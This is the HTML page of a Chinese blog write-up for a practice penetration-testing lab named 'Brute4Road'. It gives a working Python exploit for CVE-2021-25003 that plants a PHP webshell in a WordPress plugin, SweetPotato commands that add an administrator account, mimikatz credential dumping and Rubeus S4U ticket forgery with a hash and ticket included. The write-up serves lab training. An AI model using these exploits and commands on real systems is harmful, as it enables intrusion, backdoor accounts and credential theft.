@@ -1,0 +1,169 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Brute4Road - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <div class="c-post__toc-empty">
+            <i class="fas fa-info-circle"></i> 本文暂无小节
+        </div>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Brute4Road</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2024-01-11 17:49</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2024-09-11 10:47</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                春秋云镜靶场
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111154806.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111154806.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>首先fscan扫描发现到redis未授权,使用脚本反弹shell</p>
+<p>然后suid提权<code>find / -user root -perm -4000 -print 2&gt; result.txt</code></p>
+<p>发现base64具有权限<code>base64 &quot;/home/redis/flag/flag01&quot; | base64 --decode</code>即可获得第一个flag</p>
+<p>挂好代理</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164119.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164119.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>proxychains wpscan --url http://172.22.2.18</code>发现有插件漏洞CVE-2021-25003</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This is a magic string that when treated as pixels and compressed using the png</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode_character_code</span><span class="p">(</span><span class="n">c</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;</span><span class="si">{:08b}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">encode_character_code</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">)])[</span><span class="mi">1</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">destination_url</span> <span class="o">=</span> <span class="s1">&#39;http://172.22.2.18/&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s1">&#39;ls&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With 1/11 scale, &#39;1&#39;s will be encoded as single white pixels, &#39;x&#39;s as single black pixels.</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">wp-content/plugins/wpcargo/includes/barcode.php?text=</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># We have uploaded a webshell - now let&#39;s use it to execute a command.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">destination_url</span><span class="si">}</span><span class="s2">webshell.php?1=system&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;2&#34;</span><span class="p">:</span> <span class="n">cmd</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
+</span></span></code></pre></div></div><p>直接打</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164845.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111164845.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>打完之后写蚁剑,查找配置文件链接数据库后发现第二个flag,除此外还有密码表</p>
+<p>是mssql的密码,爆破得到密码后
+MDUT启动</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172012.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172012.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>然后 Ole Automation Procedures 激活成功</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172245.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172245.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">C:/Users/Public/sweetpotato.exe -a <span class="s2">&#34;net user fushuling qwer1234! /add&#34;</span> 
+</span></span><span class="line"><span class="cl">C:/Users/Public/sweetpotato.exe -a <span class="s2">&#34;net localgroup administrators fushuling /add&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p>加用户rdp过去</p>
+<p>老位置拿到flag</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172520.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111172520.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>然后复制<div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173810.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173810.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>拿到<code>privilege::debug</code> <code>sekurlsa::logonpasswords</code></p>
+<p>通过 S4U 伪造高权限 ST 拿下域控,用Rubeus申请访问自身的服务票据</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173747.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111173747.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:a7905626907766f2f194959fdb48e1c8 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</code></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174223.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174223.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p><code>Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE2NAMQwjN0euTL2K0mYmuybf8gRxGV3xKqwt9M+BRmLNyVHJ8O0PPydV5hYS0i4y0b6ERrLEGX5YOOc5YyTdzkZiTs6pWrLQj51XMISjQbROYeKp0kWaZLCLGHe+Muc8CSe/NIDUiosKVe+LgFj2YoDASf3zL5ShJGPSsASnsBY6RCTV6XzSoLWYsoLVzQSe7uuSy9tv6yTkv58k6YwvdmD4h4rmXVaKT52m9rKjiMmLU2S/V6jGlcb98fFBmqZwCEINZ/F0uGjQ5CIwFdHpn19m0RUHyawcVBRVUF1y8ZBdpfsaRWbNkiCxlRBXJ+g/U6hTqBfRgU3npoqz8oRG7HuA6nky4DamRdSQHoIrfjCgRFEdtvXO9Cnnwb5H9/BQUxp/6dTbwd6Y1dMivtB0UBW5YKPayE2Ze6tNOlyJ/Ll1bPvxoSsfj2bxWtR2zhoFVOrBrv9+rzoWnqoKV9zwLZnaTfzLiA6zKqZZld2OOnm60ehfkbQbGRJBPrjKpTMYG1n0BXsOH4qcFvOqXW8iYkIdymuQgEyT3ufd7pe44K5fDQG7sGKS7gZUdYJMJmY0ZNfZMgsejRyLH4lWm3/zqbgSv9EmWZ7wK3kMB7DUDfUvY7n1mhlQrR8meLO65ryDTRjt7a9YhR2mpT8oDMEw3SUJFFCc5+DXyD+3NOQKpavfq0KtGUUKcQzV53six4UCzxAS10Qm0THmWgiZ6MzE1SZwTca5YE4JvKJ4rGxHiTYsXDxCgrthf72Ddb+xM6H/I+qFIFBkPjjU9JKP1UEddWQut5BumidoEz+D8VLsrrKHqFBw0lc/HZuFHFNzZSdcyf8dqXXbb79rjIK40YH264+0HhZF5LeHdjl3tV7ryE+Mj9OnTOnWPPrhlwjBxX5AhD6LmGJNfiuIAWKPRvXYTHgVKmm01c4tRaPq5x0+eW+rh8TquSf/BnTJXRK4mg6/kI8LY6wvDOmoJdh4xvms960n/EH5FhczMwjF3j4u2ab5JR1ujTct5aEMDofh04ZLIomoYuMQ2TbIi33OrQ8anUzg2jneOBOkw+opsJYY/PELf37PN+/aCnIdfR+u0/GNRjqpRH/Kq7bI5impRnM7vxz0yAxoAnuRsFKj+ALLjHE/QFdMsta0Wx1RroJa9RJ6avSv+mjwwQy2AnyRh1dEaofg9fILBjLqdrPIVA9alylR2EARnUueYN75oMZwJq4AD1arAVinSn9VMxWRV4tAx3Wl+Yq9xgcaYKvWrD3Uk+TlyuZ0L+xtmjjNrL502DNausiI9HJBdWDwvY+5AQGDwAVvcSeZeeWFCDMleSF4wi2YkgUV6SV0l6PpKBFqyaxyO8clLm8tndPb+bRuCL/kNGblUrSxZ0ih7utz/qSlXWxPzd+tmOEg5Nfs7qwgtPxlwKy8Y8jdS0ZQ2wZCosMKHJHjsWafNo+Xadb6sXX9CmyzhSlP0io/FqH2gblMLSjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCSJYfAkBcTVbjKHIzVWj/VoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI0MDExMTA5NDE0N1qmERgPMjAyNDAxMTExOTQxNDdapxEYDzIwMjQwMTE4MDk0MTQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</code></p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174806.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020240111174806.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>这样就算是拿到了</p>
+<p><code>type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</code></p>
+<p><code>flag{69371bca-db8c-46a6-8580-3d4eea725228}</code></p>
+</article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/2022%e7%bd%91%e9%bc%8e%e6%9d%af%e5%8d%8a%e5%86%b3%e8%b5%9b%e5%a4%8d%e7%9b%98" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">2022网鼎杯半决赛复盘</p>
+            </a>
+            
+
+            
+            <a href="/post/tunnelx" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">TunnelX</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
